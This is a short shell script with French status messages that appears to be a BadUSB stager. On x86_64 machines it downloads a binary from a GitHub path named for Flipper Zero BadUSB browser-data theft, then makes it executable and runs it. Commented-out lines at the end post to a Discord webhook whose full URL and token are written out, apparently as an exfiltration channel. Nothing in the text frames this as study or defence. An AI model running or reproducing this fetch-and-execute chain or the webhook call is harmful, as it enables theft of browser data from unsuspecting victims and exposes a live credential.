architecture=$(uname -m)

if [ "$architecture" == "armv7l" ]; then
    echo "L'architecture est ARM."
elif [ "$architecture" == "x86_64" ]; then
    curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64 -o test_script.sh
    chmod +x test_script.sh
    ./test_script.sh
elif [ "$architecture" == "i686" ] || [ "$architecture" == "i386" ]; then
    echo "L'architecture est x86 (32 bits)."
else
    echo "L'architecture n'est pas reconnue : $architecture."
fi


#export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"
#curl \
#  -H "Content-Type: application/json" \
#  -d '{"username": "Murerig", "content": "Coin ? 🦆"}' \
#  $WEBHOOK_URL